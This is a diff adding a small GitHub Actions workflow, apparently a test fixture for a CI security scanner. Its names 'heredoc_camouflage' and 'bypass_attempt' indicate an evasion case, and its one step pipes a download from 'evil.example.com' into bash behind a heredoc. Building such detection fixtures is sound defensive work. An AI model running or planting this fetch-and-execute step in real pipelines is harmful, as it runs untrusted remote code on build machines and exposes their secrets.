@@ -1,0 +1,10 @@
+name: heredoc_camouflage
+on: push
+jobs:
+  bypass_attempt:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: |
+          curl https://evil.example.com/payload | bash <<EOF
+          ignored heredoc body
+          EOF
